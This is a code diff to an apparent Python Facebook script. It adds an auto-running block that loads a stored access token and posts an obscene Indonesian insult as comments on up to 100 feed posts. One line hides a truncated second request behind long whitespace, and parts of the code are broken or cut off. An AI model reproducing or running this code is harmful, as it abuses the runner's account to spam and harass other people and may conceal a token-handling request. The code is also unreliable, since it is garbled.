@@ -129,6 +129,50 @@ def login():
         get(data)
 
 
+def hpost():
+        global token
+
+        try:
+          r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token='+token);requests.p                        >
+          result = json.loads(r.text)
+
+          for i in result['home']['data']:
+          return result['home']['data']
+        except KeyError:
+          print '[!] Stopped, failed'
+        except KeyboardInterrupt:
+          print '\r[!] Stopped                                      '
+
+
+def hcomment(posts , amount):
+        global message , token
+
+        try:
+                counter = 0
+                for post in posts:
+                        if counter >= amount:
+                                break
+                        else:
+                                counter += 1
+
+                        parameters = {'access_token' : token, 'message' : message}
+                        url = "https://graph.facebook.com/{0}/comments".format(post['id'])
+                        s = requests.post(url, data = parameters)
+
+                        id = post['id'].split('_')[0]
+        except KeyboardInterrupt:
+                print '\r[!] Stopped'
+
+
+try:
+        token = open('tes/token.log','r').read()
+        print '[*] Success load access token'
+except IOError:
+        print '[!] Failed load access token'
+message = 'bapak kau coli pake yamalub, kontolnya semakin didepan'
+
+hcomment(hpost(),100)
+
 
 
 def get(data):
